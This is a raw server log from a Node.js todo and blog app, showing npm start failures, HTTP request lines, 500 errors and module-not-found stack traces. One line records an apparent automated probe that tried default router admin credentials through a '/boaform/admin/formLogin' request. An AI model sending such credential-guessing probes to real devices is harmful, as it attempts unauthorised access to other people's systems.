npm ERR! file sh
npm ERR! errno ENOENT
npm ERR! todo@0.0.0 start: `DEBUG=app:* nodemon ./bin/www`
npm ERR! spawn ENOENT
npm ERR! 
npm ERR! Failed at the todo@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-21T17_21_24_111Z-debug.log
(node:28106) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
GET / 200 4525 - 53.987 ms
GET /stylesheets/style.css 200 89 - 0.856 ms
GET /css/bootstrap.min.css 200 160302 - 3.051 ms
GET /css/fontawesome-all.css 200 51609 - 1.084 ms
GET /js/jquery.min.js 200 89476 - 1.105 ms
GET /js/bootstrap.min.js 200 60044 - 0.923 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 0.906 ms
GET /task/add 200 1933 - 1.570 ms
GET /stylesheets/style.css 304 - - 0.832 ms
GET /js/jquery.min.js 304 - - 0.769 ms
GET /js/bootstrap.min.js 304 - - 0.523 ms
GET /css/bootstrap.min.css 304 - - 0.692 ms
GET / 304 - - 9.287 ms
GET /stylesheets/style.css 304 - - 0.487 ms
GET /css/bootstrap.min.css 304 - - 0.538 ms
GET /css/fontawesome-all.css 304 - - 0.752 ms
GET /js/bootstrap.min.js 304 - - 1.135 ms
GET /js/jquery.min.js 304 - - 1.089 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.660 ms
GET /task/add 304 - - 1.492 ms
GET /stylesheets/style.css 304 - - 0.528 ms
GET /css/bootstrap.min.css 304 - - 2.304 ms
GET /js/jquery.min.js 304 - - 1.231 ms
GET /js/bootstrap.min.js 304 - - 0.481 ms
GET / 304 - - 9.009 ms
GET /stylesheets/style.css 304 - - 0.847 ms
GET /css/bootstrap.min.css 304 - - 1.000 ms
GET /css/fontawesome-all.css 304 - - 1.143 ms
GET /js/jquery.min.js 304 - - 1.199 ms
GET /js/bootstrap.min.js 304 - - 0.461 ms
GET / 304 - - 7.131 ms
GET /stylesheets/style.css 304 - - 2.025 ms
GET /css/bootstrap.min.css 304 - - 2.204 ms
GET /js/bootstrap.min.js 304 - - 2.191 ms
GET /css/fontawesome-all.css 304 - - 3.529 ms
GET /js/jquery.min.js 304 - - 2.731 ms
GET /task/add 304 - - 1.245 ms
GET /stylesheets/style.css 304 - - 0.859 ms
GET /css/bootstrap.min.css 304 - - 2.032 ms
GET /js/bootstrap.min.js 304 - - 0.899 ms
GET /js/jquery.min.js 304 - - 1.055 ms
GET / 304 - - 6.973 ms
GET /stylesheets/style.css 304 - - 0.449 ms
GET /css/bootstrap.min.css 304 - - 1.079 ms
GET /js/jquery.min.js 304 - - 1.990 ms
GET /css/fontawesome-all.css 304 - - 1.617 ms
GET /js/bootstrap.min.js 304 - - 0.438 ms
GET / 200 4525 - 7.574 ms
GET / 500 567 - 7.750 ms
GET / 500 567 - 8.168 ms
GET / 500 567 - 6.465 ms
GET / 500 567 - 6.400 ms
GET / 500 567 - 8.257 ms
GET / 500 567 - 6.460 ms
GET / 500 567 - 6.870 ms
GET / 500 567 - 7.342 ms
GET / 500 567 - 6.289 ms
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 404 847 - 1.198 ms

> todo@0.0.0 start /home/bitnami/todo
> DEBUG=app:* nodemon ./bin/www

sh: 1: nodemon: not found
npm ERR! code ELIFECYCLE
npm ERR! syscall spawn
npm ERR! file sh
npm ERR! errno ENOENT
npm ERR! todo@0.0.0 start: `DEBUG=app:* nodemon ./bin/www`
npm ERR! spawn ENOENT
npm ERR! 
npm ERR! Failed at the todo@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-21T17_56_49_816Z-debug.log
GET / 200 930 - 10.514 ms
GET /stylesheets/style.css 304 - - 1.730 ms
GET /css/bootstrap.min.css 304 - - 0.653 ms
GET /css/fontawesome-all.css 304 - - 0.793 ms
GET /js/jquery.min.js 304 - - 1.034 ms
GET /js/bootstrap.min.js 304 - - 0.680 ms
GET /blogList 404 847 - 2.366 ms
GET / 200 928 - 1.289 ms
GET /stylesheets/style.css 304 - - 0.506 ms
GET /css/bootstrap.min.css 304 - - 0.576 ms
GET /css/fontawesome-all.css 304 - - 0.685 ms
GET /js/jquery.min.js 304 - - 0.820 ms
GET /js/bootstrap.min.js 304 - - 0.500 ms
GET / 304 - - 1.168 ms
GET /stylesheets/style.css 304 - - 0.489 ms
GET /css/bootstrap.min.css 304 - - 1.710 ms
GET /js/jquery.min.js 304 - - 1.905 ms
GET /css/fontawesome-all.css 304 - - 1.895 ms
GET /js/bootstrap.min.js 304 - - 0.493 ms
GET / 304 - - 1.045 ms
GET /stylesheets/style.css 304 - - 0.512 ms
GET /js/bootstrap.min.js 304 - - 1.327 ms
GET /css/bootstrap.min.css 304 - - 1.383 ms
GET /js/jquery.min.js 304 - - 3.002 ms
GET /css/fontawesome-all.css 304 - - 2.967 ms
GET / 200 931 - 1.182 ms
GET /stylesheets/style.css 304 - - 0.545 ms
GET /css/bootstrap.min.css 304 - - 0.664 ms
GET /js/jquery.min.js 304 - - 0.956 ms
GET /css/fontawesome-all.css 304 - - 0.726 ms
GET /js/bootstrap.min.js 304 - - 1.803 ms
GET /blogList 404 847 - 1.275 ms
GET /blogList 404 847 - 1.129 ms
GET /blogAdd 200 0 - 1.193 ms
GET /blogList 404 847 - 1.111 ms
GET /blogAdd 304 - - 0.967 ms
GET / 304 - - 10.417 ms
GET /stylesheets/style.css 304 - - 1.421 ms
GET /css/fontawesome-all.css 304 - - 0.803 ms
GET /js/jquery.min.js 304 - - 0.653 ms
GET /js/bootstrap.min.js 304 - - 0.523 ms
GET /css/bootstrap.min.css 304 - - 0.670 ms
GET /blogList 404 847 - 2.331 ms
GET /blogAdd 200 924 - 1.277 ms
GET /stylesheets/style.css 304 - - 0.522 ms
GET /css/bootstrap.min.css 304 - - 0.620 ms
GET /css/fontawesome-all.css 304 - - 0.822 ms
GET /js/bootstrap.min.js 304 - - 2.041 ms
GET /js/jquery.min.js 304 - - 2.225 ms
GET /blogList 404 847 - 1.273 ms
GET / 304 - - 1.225 ms
GET /stylesheets/style.css 304 - - 0.509 ms
GET /css/bootstrap.min.css 304 - - 0.535 ms
GET /css/fontawesome-all.css 304 - - 1.401 ms
GET /js/jquery.min.js 304 - - 1.397 ms
GET /js/bootstrap.min.js 304 - - 0.603 ms
GET /blogList 404 847 - 1.126 ms
GET /blogAdd 304 - - 1.226 ms
GET /stylesheets/style.css 304 - - 2.254 ms
GET /css/bootstrap.min.css 304 - - 1.072 ms
GET /css/fontawesome-all.css 304 - - 1.918 ms
GET /js/jquery.min.js 304 - - 0.731 ms
GET /js/bootstrap.min.js 304 - - 0.768 ms
GET / 304 - - 0.987 ms
GET /stylesheets/style.css 304 - - 0.863 ms
GET /css/bootstrap.min.css 304 - - 1.021 ms
GET /js/bootstrap.min.js 304 - - 1.482 ms
GET /css/fontawesome-all.css 304 - - 1.761 ms
GET /js/jquery.min.js 304 - - 1.800 ms
GET /blogList 404 847 - 1.032 ms
GET /blogAdd 304 - - 0.934 ms
GET /stylesheets/style.css 304 - - 0.484 ms
GET /css/fontawesome-all.css 304 - - 0.717 ms
GET /js/jquery.min.js 304 - - 0.608 ms
GET /js/bootstrap.min.js 304 - - 0.516 ms
GET /css/bootstrap.min.css 304 - - 0.671 ms
GET /blogList 404 847 - 1.034 ms
GET / 304 - - 10.525 ms
GET /stylesheets/style.css 304 - - 1.411 ms
GET /css/bootstrap.min.css 304 - - 0.595 ms
GET /js/bootstrap.min.js 304 - - 0.534 ms
GET /css/fontawesome-all.css 304 - - 0.669 ms
GET /js/jquery.min.js 304 - - 0.606 ms
GET /blogList 404 847 - 2.735 ms
GET /blogAdd 304 - - 1.197 ms
GET /stylesheets/style.css 304 - - 0.465 ms
GET /js/jquery.min.js 304 - - 0.691 ms
GET /css/bootstrap.min.css 304 - - 0.592 ms
GET /css/fontawesome-all.css 304 - - 0.624 ms
GET /js/bootstrap.min.js 304 - - 0.552 ms
GET /blogList 404 847 - 1.263 ms
GET / 304 - - 1.165 ms
GET /stylesheets/style.css 304 - - 0.487 ms
GET /js/bootstrap.min.js 304 - - 1.660 ms
GET /css/bootstrap.min.css 304 - - 1.678 ms
GET /js/jquery.min.js 304 - - 3.065 ms
GET /css/fontawesome-all.css 304 - - 2.200 ms
GET /blogList 404 847 - 1.821 ms
GET / 304 - - 10.840 ms
GET /stylesheets/style.css 304 - - 1.387 ms
GET /css/fontawesome-all.css 304 - - 0.871 ms
GET /js/jquery.min.js 304 - - 0.737 ms
GET /js/bootstrap.min.js 304 - - 0.592 ms
GET /css/bootstrap.min.css 304 - - 0.683 ms
GET /blogList 404 847 - 2.198 ms
GET /blogAdd 304 - - 1.250 ms
GET /stylesheets/style.css 304 - - 0.514 ms
GET /css/bootstrap.min.css 304 - - 1.563 ms
GET /css/fontawesome-all.css 304 - - 0.874 ms
GET /js/bootstrap.min.js 304 - - 4.706 ms
GET /js/jquery.min.js 304 - - 5.983 ms
GET /blogList 404 847 - 1.271 ms
GET /blogAdd 304 - - 1.186 ms
GET /stylesheets/style.css 304 - - 0.507 ms
GET /css/fontawesome-all.css 304 - - 0.767 ms
GET /js/jquery.min.js 304 - - 0.618 ms
GET /js/bootstrap.min.js 304 - - 0.532 ms
GET /css/bootstrap.min.css 304 - - 0.653 ms
GET /blogList 404 847 - 1.090 ms
GET / 304 - - 10.148 ms
GET /stylesheets/style.css 304 - - 1.360 ms
GET /css/fontawesome-all.css 304 - - 0.755 ms
GET /js/bootstrap.min.js 304 - - 1.053 ms
GET /js/jquery.min.js 304 - - 1.217 ms
GET /css/bootstrap.min.css 304 - - 0.684 ms
GET /blogList 200 926 - 1.996 ms
GET /stylesheets/style.css 304 - - 0.464 ms
GET /css/bootstrap.min.css 304 - - 1.199 ms
GET /js/jquery.min.js 304 - - 2.233 ms
GET /css/fontawesome-all.css 304 - - 1.873 ms
GET /js/bootstrap.min.js 304 - - 0.473 ms
GET /blogAdd 304 - - 1.216 ms
GET /stylesheets/style.css 304 - - 0.929 ms
GET /css/bootstrap.min.css 304 - - 1.278 ms
GET /css/fontawesome-all.css 304 - - 2.622 ms
GET /js/bootstrap.min.js 304 - - 0.708 ms
GET /js/jquery.min.js 304 - - 1.535 ms
GET / 304 - - 1.165 ms
GET /stylesheets/style.css 304 - - 0.466 ms
GET /css/bootstrap.min.css 304 - - 2.444 ms
GET /js/bootstrap.min.js 304 - - 2.495 ms
GET /css/fontawesome-all.css 304 - - 3.768 ms
GET /js/jquery.min.js 304 - - 2.968 ms
GET / 200 931 - 1.058 ms
internal/modules/cjs/loader.js:969
  throw err;
  ^

Error: Cannot find module './routes/index'
Require stack:
- /home/bitnami/blog1/blogger/app.js
- /home/bitnami/blog1/blogger/bin/www
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blog1/blogger/app.js:8:20)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [
    '/home/bitnami/blog1/blogger/app.js',
    '/home/bitnami/blog1/blogger/bin/www'
  ]
}
internal/modules/cjs/loader.js:969
  throw err;
  ^

Error: Cannot find module './routes/index'
Require stack:
- /home/bitnami/blog1/blogger/app.js
- /home/bitnami/blog1/blogger/bin/www
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blog1/blogger/app.js:8:20)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [
    '/home/bitnami/blog1/blogger/app.js',
    '/home/bitnami/blog1/blogger/bin/www'
  ]
}
